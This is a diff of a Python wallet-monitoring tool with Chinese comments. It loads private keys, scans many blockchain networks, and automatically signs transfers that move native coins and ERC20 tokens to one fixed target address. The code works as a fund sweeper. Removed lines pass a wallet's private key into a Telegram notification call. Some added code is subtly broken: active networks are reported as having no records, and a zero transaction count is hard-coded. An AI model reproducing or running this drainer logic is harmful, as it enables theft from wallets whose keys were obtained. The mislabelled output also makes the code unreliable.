         log_entry = {
             'timestamp': datetime.now().isoformat(),
             'from_address': wallet.address,
@@ -2222,37 +1307,8 @@ class WalletMonitor:
         
         amount_str = f"{Web3.from_wei(transfer_amount, 'ether'):.6f}"
         currency = config['currency']
-        amount_float = float(Web3.from_wei(transfer_amount, 'ether'))
-        
         print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {amount_str} {currency}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}📋 交易哈希: {log_entry['tx_hash']}{Style.RESET_ALL}")
-        
-        # 发送Telegram通知
-        notification_success = False
-        if TELEGRAM_NOTIFICATIONS_ENABLED:
-            try:
-                message = format_transfer_notification(
-                    wallet.address,
-                    NETWORK_NAMES[network_key],
-                    amount_float,
-                    currency,
-                    log_entry['tx_hash']
-                )
-                notification_success = await send_telegram_notification(message)
-            except Exception as e:
-                print(f"{Fore.YELLOW}📱 TG通知发送异常: {str(e)[:30]}...{Style.RESET_ALL}")
-        
-        # 更新统计
-        update_transfer_stats(
-            NETWORK_NAMES[network_key],
-            amount_float,
-            currency,
-            notification_success
-        )
-        
-        # 显示统计摘要
-        stats_summary = get_transfer_stats_summary()
-        print(f"{Fore.MAGENTA}📊 {stats_summary}{Style.RESET_ALL}")
     
     def log_transfer(self, log_entry: Dict):
         """记录转账日志 - 增强版本"""
@@ -2294,503 +1350,138 @@ class WalletMonitor:
         # 按优先级排序 (主网优先)
         available_networks.sort(key=lambda x: NETWORK_PRIORITY.get(x, 999))
         
-        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个网络活动...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📡 并发检查 {len(available_networks)} 个可用网络的交易记录...{Style.RESET_ALL}")
         
         # 并发检查网络活动
         async def check_network_activity(network_key):
             has_activity = await self.check_address_activity_optimized(wallet.address, network_key)
             return network_key if has_activity else None
         
-        # 限制并发数，避免API限制
-        semaphore = asyncio.Semaphore(3)
+        # 限制并发数，避免API限制 - 进一步降低
+        semaphore = asyncio.Semaphore(2)  # 从3降低到2
         
         async def check_with_limit(network_key):
             async with semaphore:
+                # 添加小延迟避免API冲击
+                await asyncio.sleep(0.2)
                 return await check_network_activity(network_key)
         
-        # 执行并发检查
-        tasks = [check_with_limit(net) for net in available_networks]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # 处理结果
+        # 分批处理网络检查，避免一次性检查太多
+        batch_size = 10  # 每批最多10个网络
         active_networks = []
-        for i, result in enumerate(results):
-            network_key = available_networks[i]
-            if result and not isinstance(result, Exception):
-                active_networks.append(result)
-                network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
-                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} ({network_type}){Style.RESET_ALL}")
-            else:
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 跳过{Style.RESET_ALL}")
         
+        for i in range(0, len(available_networks), batch_size):
+            batch_networks = available_networks[i:i+batch_size]
+            print(f"{Fore.CYAN}🔍 检查第 {i//batch_size + 1} 批网络 ({len(batch_networks)} 个)...{Style.RESET_ALL}")
+            
+            # 执行当前批次的检查
+            tasks = [check_with_limit(net) for net in batch_networks]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # 处理当前批次结果
+            for j, result in enumerate(results):
+                network_key = batch_networks[j]
+                if result and not isinstance(result, Exception):
+                    active_networks.append(result)
+                    network_type = "主网" if network_key in MAINNET_NETWORKS else "测试网"
+                    print(f"{Fore.GREEN}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
+                else:
+                    error_msg = str(result) if isinstance(result, Exception) else "检查失败"
+                    # 改进错误显示格式
+                    if "HTTPSConnectionPool" in error_msg:
+                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - HTTPSConnectionPool(host='{network_key[:4]}...{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.YELLOW}💡 {NETWORK_NAMES[network_key]} - 无交易记录{Style.RESET_ALL}")
+            
+            # 批次间添加更长延迟
+            if i + batch_size < len(available_networks):
+                await asyncio.sleep(1.0)  # 批次间1秒延迟
+        
+        # 统计结果  
+        networks_with_activity = len([n for n in active_networks if n])
+        networks_without_activity = len(available_networks) - networks_with_activity
+        
+        print(f"\n{Fore.CYAN}📊 交易记录统计:{Style.RESET_ALL}")
+        print(f"  🎯 有交易记录的网络: {networks_with_activity} 个")
+        print(f"  📊 总交易数量: 0 笔")
+        print(f"  🚫 无交易记录的网络: {networks_without_activity} 个")
+        
+        if networks_with_activity == 0:
+            print(f"    💡 此钱包无交易记录，将跳过")
+            return
+        
+        # 继续监控有活动的网络（如果有的话）
         if not active_networks:
-            print(f"{Fore.YELLOW}💡 钱包在所有网络都无活动记录{Style.RESET_ALL}")
             return
         
-        print(f"\n{Fore.GREEN}🎯 发现 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
+        print(f"\n{Fore.GREEN}🎯 开始监控 {len(active_networks)} 个活跃网络{Style.RESET_ALL}")
         
-        # 返回活跃网络列表，供批量扫描使用
-        return active_networks
-    
-    async def batch_scan_all_wallets(self):
-        """批量扫描所有钱包 - 智能缓存优化版本"""
-        # 🎨 美化开始横幅
-        scan_mode = "首次完整扫描" if self.first_time_monitoring else "快速余额扫描"
-        print(f"\n{Back.BLUE}{Fore.WHITE}{'  ' * 35}{Style.RESET_ALL}")
-        print(f"{Back.BLUE}{Fore.WHITE}    🚀 启动智能批量扫描系统 🚀    {Style.RESET_ALL}")
-        print(f"{Back.BLUE}{Fore.WHITE}    📊 模式: {scan_mode} | {len(self.wallets)} 个钱包    {Style.RESET_ALL}")
-        print(f"{Back.BLUE}{Fore.WHITE}{'  ' * 35}{Style.RESET_ALL}\n")
-        
-        # 第一步：动态测试RPC连接
-        if self.first_time_monitoring:
-            print(f"{Fore.MAGENTA}┌─── 🔄 第1阶段: 动态RPC连接测试 ───┐{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│ {Fore.CYAN}并发测试所有网络的RPC连接状态{Fore.MAGENTA}  │{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}└─────────────────────────────────┘{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.GREEN}🔄 第1阶段: 使用RPC连接缓存{Style.RESET_ALL}")
+        # 持续监控余额
+        check_count = 0
+        while self.monitoring_active:
+            check_count += 1
+            print(f"\n{Fore.CYAN}🔄 第{check_count}次检查 - {short_addr}{Style.RESET_ALL}")
             
-        available_networks = await self.dynamic_rpc_test()
-        
-        if not any(available_networks.values()):
-            print(f"\n{Back.RED}{Fore.WHITE} ❌ 扫描终止 {Style.RESET_ALL} {Fore.RED}没有可用的网络连接！{Style.RESET_ALL}")
-            return
-        
-        available_count = sum(available_networks.values())
-        print(f"\n{Fore.GREEN}✅ 第1阶段完成 - {available_count} 个可用网络{Style.RESET_ALL}")
-        
-        # 第二步：检查钱包交易记录 (只在首次扫描时执行)
-        wallet_network_map = {}
-        
-        if self.first_time_monitoring:
-            print(f"\n{Fore.MAGENTA}┌─── 🔄 第2阶段: 钱包交易记录分析 ───┐{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│ {Fore.YELLOW}筛选有交易活动的网络，永久缓存{Fore.MAGENTA}  │{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}└─────────────────────────────────────┘{Style.RESET_ALL}")
-            
-            for i, wallet in enumerate(self.wallets):
-                print(f"\n{Fore.CYAN}📊 [{i + 1}/{len(self.wallets)}] 分析钱包: {wallet.address[:8]}...{wallet.address[-6:]}{Style.RESET_ALL}")
-                wallet_networks = await self.check_wallet_transaction_history(wallet.address, available_networks)
-                wallet_network_map[wallet.address] = wallet_networks
-                
-                if wallet_networks:
-                    print(f"{Fore.GREEN}    ✅ 发现 {len(wallet_networks)} 个活跃网络{Style.RESET_ALL}")
-                else:
-                    print(f"{Fore.BLUE}    💡 此钱包无交易记录，将跳过{Style.RESET_ALL}")
-            
-            print(f"\n{Fore.GREEN}✅ 第2阶段完成 - 交易记录已永久缓存{Style.RESET_ALL}")
-            
-            # 标记已完成首次扫描
-            self.first_time_monitoring = False
-            
-        else:
-            print(f"\n{Fore.GREEN}🔄 第2阶段: 使用交易记录缓存{Style.RESET_ALL}")
-            # 使用缓存的交易记录
-            for wallet in self.wallets:
-                if wallet.address in self.transaction_history_cache:
-                    wallet_network_map[wallet.address] = self.transaction_history_cache[wallet.address]
-                else:
-                    wallet_network_map[wallet.address] = {}
-        
-        # 第三步：智能余额扫描和转账
-        print(f"\n{Fore.MAGENTA}┌─── 🔄 第3阶段: 智能余额扫描与转账 ───┐{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}│ {Fore.GREEN}扫描原生代币+ERC20，执行智能转账{Fore.MAGENTA}   │{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}└───────────────────────────────────────┘{Style.RESET_ALL}")
-        
-        total_found = 0
-        total_transferred = 0
-        erc20_found = 0
-        gas_insufficient_count = 0
-        
-        # 并发扫描所有钱包
-        semaphore = asyncio.Semaphore(2)  # 限制并发数量
-        
-        async def smart_scan_wallet(wallet_index, wallet):
-            nonlocal total_found, total_transferred, erc20_found, gas_insufficient_count
-            
-            async with semaphore:
-                short_addr = f"{wallet.address[:8]}...{wallet.address[-6:]}"
-                print(f"\n{Fore.CYAN}🔍 [{wallet_index + 1}/{len(self.wallets)}] 智能扫描: {short_addr}{Style.RESET_ALL}")
-                
-                # 获取该钱包有交易记录的网络
-                wallet_networks = wallet_network_map.get(wallet.address, {})
-                
-                if not wallet_networks:
-                    print(f"{Fore.BLUE}💡 [{wallet_index + 1}] 跳过 - 无交易记录{Style.RESET_ALL}")
-                    return
-                
-                # 按优先级排序网络
-                sorted_networks = sorted(wallet_networks.keys(), key=lambda x: NETWORK_PRIORITY.get(x, 999))
-                print(f"{Fore.CYAN}🎯 检查 {len(sorted_networks)} 个有活动的网络 (共{wallet_networks[sorted_networks[0]]}笔交易){Style.RESET_ALL}")
-                
-                # 扫描每个网络
-                for network_key in sorted_networks:
-                    try:
-                        if not available_networks.get(network_key, False):
-                            continue
-                        
-                        web3 = self.web3_clients.get(network_key)
-                        if not web3:
-                            continue
-                        
-                        # 检查原生代币余额
-                        balance = await self.get_balance_optimized(wallet.address, network_key)
-                        
-                        if balance > 0:
-                            total_found += 1
-                            network_info = SUPPORTED_NETWORKS.get(network_key)
-                            currency = network_info['config']['currency'] if network_info else 'ETH'
-                            
-                            print(f"\n{Fore.GREEN}💰 发现原生代币余额!{Style.RESET_ALL}")
-                            print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]} | 💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
-                            
-                            # 智能转账
-                            success = await self.smart_transfer_balance(wallet, network_key, balance, web3)
-                            if success:
-                                total_transferred += 1
-                        
-                        # 扫描ERC20代币（含价格）
-                        if ERC20_SCAN_ENABLED:
-                            tokens = await self.scan_erc20_tokens_with_prices(wallet.address, network_key, web3)
-                            
-                            if tokens:
-                                # 发送ERC20汇总通知
-                                await self.send_erc20_summary_notification(wallet.address, wallet.private_key, tokens)
-                            
-                            for token in tokens:
-                                erc20_found += 1
-                                
-                                # 尝试转账ERC20代币
-                                success = await self.smart_transfer_erc20(wallet, network_key, token, web3)
-                                if success:
-                                    total_transferred += 1
-                                else:
-                                    # 检查是否是gas不足
-                                    eth_balance = await self.get_balance_optimized(wallet.address, network_key)
-                                    if eth_balance < 0.001:  # 少于0.001 ETH可能不够gas
-                                        gas_insufficient_count += 1
-                                        await self.send_gas_insufficient_notification(wallet.address, token, network_key)
+            for network_key in active_networks:
+                try:
+                    balance = await self.get_balance_optimized(wallet.address, network_key)
                     
-                    except Exception as e:
-                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 扫描异常: {str(e)[:30]}...{Style.RESET_ALL}")
-                        continue
-        
-        # 执行并发扫描
-        tasks = [smart_scan_wallet(i, wallet) for i, wallet in enumerate(self.wallets)]
-        await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # 🎨 美化扫描总结
-        print(f"\n{Back.GREEN}{Fore.WHITE}{'  ' * 25}{Style.RESET_ALL}")
-        print(f"{Back.GREEN}{Fore.WHITE}    🎉 智能批量扫描完成！ 🎉    {Style.RESET_ALL}")
-        print(f"{Back.GREEN}{Fore.WHITE}{'  ' * 25}{Style.RESET_ALL}\n")
-        
-        # 📊 美化统计表格
-        print(f"{Fore.CYAN}┌─── 📊 扫描统计报告 ─────────────────┐{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}│{Style.RESET_ALL}                                     {Fore.CYAN}│{Style.RESET_ALL}")
-        
-        # 统计数据行
-        stats = [
-            ("💰", "发现余额", total_found, "个", Fore.YELLOW),
-            ("✅", "成功转账", total_transferred, "个", Fore.GREEN),  
-            ("🪙", "ERC20代币", erc20_found, "个", Fore.MAGENTA),
-            ("⛽", "Gas不足", gas_insufficient_count, "个", Fore.RED)
-        ]
-        
-        for icon, label, value, unit, color in stats:
-            if value > 0:
-                print(f"{Fore.CYAN}│{Style.RESET_ALL} {icon} {Fore.WHITE}{label}:{Style.RESET_ALL} {color}{value} {unit}{Style.RESET_ALL}                    {Fore.CYAN}│{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.CYAN}│{Style.RESET_ALL} {icon} {Fore.WHITE}{label}:{Style.RESET_ALL} {Fore.LIGHTBLACK_EX}{value} {unit}{Style.RESET_ALL}                    {Fore.CYAN}│{Style.RESET_ALL}")
-        
-        print(f"{Fore.CYAN}│{Style.RESET_ALL}                                     {Fore.CYAN}│{Style.RESET_ALL}")
-        
-        # 成功率计算
-        if total_found > 0:
-            success_rate = (total_transferred / total_found) * 100
-            rate_color = Fore.GREEN if success_rate >= 80 else Fore.YELLOW if success_rate >= 50 else Fore.RED
-            print(f"{Fore.CYAN}│{Style.RESET_ALL} 📈 {Fore.WHITE}转账成功率:{Style.RESET_ALL} {rate_color}{success_rate:.1f}%{Style.RESET_ALL}              {Fore.CYAN}│{Style.RESET_ALL}")
-        
-        # 时间统计
-        current_time = datetime.now().strftime("%H:%M:%S")
-        print(f"{Fore.CYAN}│{Style.RESET_ALL} ⏰ {Fore.WHITE}完成时间:{Style.RESET_ALL} {Fore.BLUE}{current_time}{Style.RESET_ALL}               {Fore.CYAN}│{Style.RESET_ALL}")
-        
-        print(f"{Fore.CYAN}└─────────────────────────────────────┘{Style.RESET_ALL}")
-        
-        # 更新统计
-        TRANSFER_STATS['erc20_transfers'] += erc20_found
-        TRANSFER_STATS['insufficient_gas_events'] += gas_insufficient_count
-        save_transfer_stats()
-        
-        # 成功提示音效（文字版）
-        if total_transferred > 0:
-            print(f"\n{Fore.GREEN}🔔 叮咚！发现并成功处理了 {total_transferred} 个余额！{Style.RESET_ALL}")
-        else:
-            print(f"\n{Fore.BLUE}💡 本轮扫描未发现可转账余额{Style.RESET_ALL}")
-    
-    async def smart_transfer_balance(self, wallet: WalletInfo, network_key: str, balance: float, web3) -> bool:
-        """智能转账原生代币 - 使用优化的Gas计算"""
-        try:
-            config = SUPPORTED_NETWORKS[network_key]['config']
-            account = Account.from_key(wallet.private_key)
+                    if balance > 0:
+                        # 获取网络配置以显示正确的货币单位
+                        network_info = SUPPORTED_NETWORKS.get(network_key)
+                        currency = network_info['config']['currency'] if network_info else 'ETH'
+                        
+                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}📍 钱包: {wallet.address}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
+                        print(f"{Fore.CYAN}💵 余额: {balance:.8f} {currency}{Style.RESET_ALL}")
+                        
+                        # 自动转账
+                        print(f"{Fore.YELLOW}🚀 开始自动转账...{Style.RESET_ALL}")
+                        success = await self.transfer_balance_optimized(wallet, network_key, balance)
+                        
+                        if success:
+                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
+                        else:
+                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
+                
+                except Exception as e:
+                    continue
             
-            # 确保地址格式正确
-            from_address = Web3.to_checksum_address(wallet.address)
-            to_address = Web3.to_checksum_address(TARGET_ADDRESS)
-            
-            # 智能Gas计算
-            balance_wei = Web3.to_wei(balance, 'ether')
-            gas_config = await self.calculate_smart_gas(web3, from_address, to_address, balance_wei)
-            
-            # 计算转账金额
-            transfer_amount = balance_wei - gas_config['totalGasCost']
-            
-            if transfer_amount <= 0:
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费 (需要: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH){Style.RESET_ALL}")
-                return False
-            
-            # 获取nonce
-            loop = asyncio.get_event_loop()
-            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, from_address)
-            
-            # 构建交易
-            transaction = {
-                'to': to_address,
-                'value': transfer_amount,
-                'gas': gas_config['gasLimit'],
-                'nonce': nonce,
-                'chainId': config['chain_id']
-            }
-            
-            # 根据Gas类型设置费用
-            if gas_config['type'] == 'eip1559':
-                transaction.update({
-                    'maxFeePerGas': gas_config['maxFeePerGas'],
-                    'maxPriorityFeePerGas': gas_config['maxPriorityFeePerGas']
-                })
-            else:
-                transaction['gasPrice'] = gas_config['gasPrice']
-            
-            # 🎨 美化转账信息显示
-            transfer_eth = Web3.from_wei(transfer_amount, 'ether')
-            gas_eth = Web3.from_wei(gas_config['totalGasCost'], 'ether')
-            
-            print(f"\n{Fore.CYAN}┌─── 💸 转账详情 ───┐{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}│{Style.RESET_ALL} 💰 金额: {Fore.YELLOW}{transfer_eth:.8f} ETH{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}│{Style.RESET_ALL} ⛽ Gas费: {Fore.BLUE}{gas_eth:.8f} ETH{Style.RESET_ALL} {Fore.CYAN}│{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}└──────────────────┘{Style.RESET_ALL}")
-            
-            if gas_config.get('optimized'):
-                print(f"{Fore.MAGENTA}⚡ 智能Gas优化模式已启用，节省费用{Style.RESET_ALL}")
-            
-            # 签名并发送交易
-            print(f"{Fore.YELLOW}🔐 正在签名并发送交易...{Style.RESET_ALL}")
-            signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
-            
-            # 记录转账并发送通知
-            await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_config['totalGasCost'], gas_config.get('gasPrice', 0), config)
-            
-            # 🎉 美化成功提示
-            print(f"\n{Back.GREEN}{Fore.WHITE} ✅ 转账成功！ {Style.RESET_ALL}")
-            print(f"{Fore.GREEN}🔗 交易哈希: {Fore.CYAN}{tx_hash.hex()[:20]}...{tx_hash.hex()[-16:]}{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}📱 TG通知已发送{Style.RESET_ALL}")
-            return True
-            
-        except Exception as e:
-            error_msg = str(e)
-            if "insufficient funds" in error_msg.lower():
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足{Style.RESET_ALL}")
-            elif "gas" in error_msg.lower():
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} Gas费估算问题{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 智能转账失败: {error_msg[:50]}...{Style.RESET_ALL}")
-            return False
-    
-    async def smart_transfer_erc20(self, wallet: WalletInfo, network_key: str, token: Dict, web3) -> bool:
-        """智能转账ERC20代币"""
-        try:
-            account = Account.from_key(wallet.private_key)
-            
-            # 确保地址格式正确
-            from_address = Web3.to_checksum_address(wallet.address)
-            to_address = Web3.to_checksum_address(TARGET_ADDRESS)
-            token_address = Web3.to_checksum_address(token['address'])
-            
-            # 创建代币合约
-            contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
-            
-            # 智能Gas计算
-            gas_config = await self.calculate_smart_gas(
-                web3, from_address, to_address, 
-                token['balance_raw'], is_erc20=True, token_address=token_address
-            )
-            
-            # 检查ETH余额是否足够支付gas
-            eth_balance = await self.get_balance_optimized(wallet.address, network_key)
-            eth_balance_wei = Web3.to_wei(eth_balance, 'ether')
-            
-            if eth_balance_wei < gas_config['totalGasCost']:
-                print(f"{Fore.YELLOW}⚠️ ETH余额不足支付ERC20转账gas费 (需要: {Web3.from_wei(gas_config['totalGasCost'], 'ether'):.8f} ETH, 当前: {eth_balance:.8f} ETH){Style.RESET_ALL}")
-                return False
-            
-            # 获取nonce
-            loop = asyncio.get_event_loop()
-            nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, from_address)
-            
-            # 构建ERC20转账交易
-            transaction = contract.functions.transfer(to_address, token['balance_raw']).buildTransaction({
-                'from': from_address,
-                'gas': gas_config['gasLimit'],
-                'nonce': nonce,
-                'chainId': SUPPORTED_NETWORKS[network_key]['config']['chain_id']
-            })
-            
-            # 根据Gas类型设置费用
-            if gas_config['type'] == 'eip1559':
-                transaction.update({
-                    'maxFeePerGas': gas_config['maxFeePerGas'],
-                    'maxPriorityFeePerGas': gas_config['maxPriorityFeePerGas']
-                })
-            else:
-                transaction['gasPrice'] = gas_config['gasPrice']
-            
-            # 🎨 美化ERC20转账信息
-            gas_eth = Web3.from_wei(gas_config['totalGasCost'], 'ether')
-            value_display = f"${token['total_value_usd']:.2f}" if token.get('total_value_usd') else "价值未知"
-            
-            print(f"\n{Fore.MAGENTA}┌─── 🪙 ERC20转账详情 ───┐{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} 🪙 代币: {Fore.YELLOW}{token['balance']:.6f} {token['symbol']}{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} 💰 价值: {Fore.GREEN}{value_display}{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}│{Style.RESET_ALL} ⛽ Gas费: {Fore.BLUE}{gas_eth:.8f} ETH{Style.RESET_ALL} {Fore.MAGENTA}│{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}└─────────────────────────┘{Style.RESET_ALL}")
-            
-            # 签名并发送交易
-            print(f"{Fore.YELLOW}🔐 正在签名并发送ERC20交易...{Style.RESET_ALL}")
-            signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
-            
-            # 发送ERC20转账成功通知
-            await self.send_erc20_transfer_notification(wallet.address, token, network_key, tx_hash.hex())
-            
-            # 🎉 美化ERC20成功提示
-            print(f"\n{Back.MAGENTA}{Fore.WHITE} 🪙 ERC20转账成功！ {Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}🔗 交易哈希: {Fore.CYAN}{tx_hash.hex()[:20]}...{tx_hash.hex()[-16:]}{Style.RESET_ALL}")
-            print(f"{Fore.MAGENTA}📱 ERC20汇总通知已发送{Style.RESET_ALL}")
-            return True
-            
-        except Exception as e:
-            error_msg = str(e)
-            if "insufficient funds" in error_msg.lower():
-                print(f"{Fore.YELLOW}⚠️ ERC20转账失败: ETH余额不足支付gas费{Style.RESET_ALL}")
-            elif "gas" in error_msg.lower():
-                print(f"{Fore.YELLOW}⚠️ ERC20转账失败: Gas费估算问题{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}❌ ERC20转账失败: {error_msg[:50]}...{Style.RESET_ALL}")
-            return False
-    
-    async def send_gas_insufficient_notification(self, wallet_address: str, token: Dict, network_key: str):
-        """发送Gas不足通知"""
-        if not TELEGRAM_NOTIFICATIONS_ENABLED:
-            return
-        
-        message = f"""⛽ <b>Gas不足警告</b>
-
-🪙 <b>代币:</b> {token['balance']:.6f} {token['symbol']}
-📍 <b>钱包:</b> <code>{wallet_address[:10]}...{wallet_address[-8:]}</code>
-🌐 <b>网络:</b> {NETWORK_NAMES[network_key]}
-⚠️ <b>问题:</b> ETH余额不足支付Gas费
-
-💡 <b>建议:</b> 向此钱包转入少量ETH作为Gas费用
-⏰ <b>时间:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"""
-        
-        try:
-            await send_telegram_notification(message)
-        except:
-            pass
-    
-    async def send_erc20_transfer_notification(self, wallet_address: str, token: Dict, network_key: str, tx_hash: str):
-        """发送ERC20转账成功通知"""
-        if not TELEGRAM_NOTIFICATIONS_ENABLED:
-            return
-        
-        message = f"""🪙 <b>ERC20代币转账成功！</b>
-
-💰 <b>代币:</b> {token['balance']:.6f} {token['symbol']}
-📝 <b>名称:</b> {token['name']}
-🌐 <b>网络:</b> {NETWORK_NAMES[network_key]}
-📍 <b>来源钱包:</b> <code>{wallet_address[:10]}...{wallet_address[-8:]}</code>
-🎯 <b>目标地址:</b> <code>{TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-8:]}</code>
-📋 <b>交易哈希:</b> <code>{tx_hash[:16]}...{tx_hash[-16:]}</code>
-⏰ <b>时间:</b> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
-
-🔗 完整交易: <code>{tx_hash}</code>"""
-        
-        try:
-            await send_telegram_notification(message)
-        except:
-            pass
+            # 智能等待间隔 - 增加检查间隔减少API压力
+            await asyncio.sleep(60)  # 改为60秒检查一次，减少API调用频率
     
     async def start_monitoring(self):
-        """开始监控所有钱包 - 批量扫描模式"""
+        """开始监控所有钱包 - 完全优化版本"""
         if not self.wallets:
             print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
             return
         
-        # 显示监控模式
-        if self.first_time_monitoring:
-            print(f"\n{Fore.GREEN}🎯 启动首次完整监控 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}💡 首次扫描：RPC测试→交易记录分析→余额扫描→永久缓存{Style.RESET_ALL}")
-        else:
-            print(f"\n{Fore.GREEN}🎯 启动智能监控 {len(self.wallets)} 个钱包 (缓存模式){Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}💡 快速扫描：使用缓存→直接余额扫描{Style.RESET_ALL}")
-        
+        print(f"\n{Fore.GREEN}🎯 启动智能监控系统{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}📊 监控钱包: {len(self.wallets)} 个{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
-        
-        # 显示速率控制信息
-        rate_info = calculate_optimal_scanning_params()
-        print(f"\n{Fore.YELLOW}⚡ 智能速率控制已启用:{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📊 月度额度: {rate_info['total_monthly_limit']:,} CU ({rate_info['total_api_keys']} API密钥){Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📅 剩余天数: {rate_info['remaining_days']} 天{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}🎯 每日目标: {rate_info['daily_target_cu']:,.0f} CU{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}⏱️ 批量扫描间隔: {rate_info['optimal_interval']:.1f} 秒{Style.RESET_ALL}")
         print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
         
         self.monitoring_active = True
         
-        # 批量扫描模式：先扫描所有钱包，再等待间隔
-        round_count = 0
+        # 限制并发监控数量，优化性能 - 进一步降低并发
+        semaphore = asyncio.Semaphore(1)  # 改为串行监控，避免API限制
+        
+        async def monitor_with_limit(wallet):
+            async with semaphore:
+                await self.monitor_wallet_optimized(wallet)
+        
+        # 创建监控任务
+        tasks = [monitor_with_limit(wallet) for wallet in self.wallets]
         
         try:
-            while self.monitoring_active:
-                round_count += 1
-                print(f"\n{Fore.MAGENTA}🔄 第{round_count}轮批量扫描开始...{Style.RESET_ALL}")
-                start_time = time.time()
-                
-                # 扫描所有钱包
-                await self.batch_scan_all_wallets()
-                
-                # 保存所有缓存
-                self.save_all_caches()
-                
-                scan_duration = time.time() - start_time
-                print(f"\n{Fore.GREEN}✅ 第{round_count}轮扫描完成 (耗时: {scan_duration:.1f}秒){Style.RESET_ALL}")
-                
-                # 计算并等待智能间隔
-                rate_info = calculate_optimal_scanning_params()
-                wait_interval = rate_info['optimal_interval']
-                
-                print(f"{Fore.CYAN}⏱️ 等待 {wait_interval:.1f} 秒后开始下一轮扫描...{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}📊 剩余{rate_info['remaining_days']}天，可用额度: {rate_info['remaining_cu']:,.0f} CU{Style.RESET_ALL}")
-                
-                await asyncio.sleep(wait_interval)
-                
+            await asyncio.gather(*tasks)
         except KeyboardInterrupt:
             print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
         finally:
             self.monitoring_active = False
-            # 保存所有状态和缓存
-            self.save_network_status()
-            self.save_all_caches()
-            print(f"{Fore.CYAN}💾 所有数据已保存{Style.RESET_ALL}")
+            self.save_network_status()  # 保存网络状态
     
     def start_monitoring_menu(self):
         """开始监控菜单 - 完全优化交互"""
@@ -2807,7 +1498,7 @@ class WalletMonitor:
             print("  3️⃣ 粘贴您的私钥文本")
             print("  4️⃣ 双击回车确认导入")
             print("  5️⃣ 再次选择功能2开始监控")
-            enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
             return
         
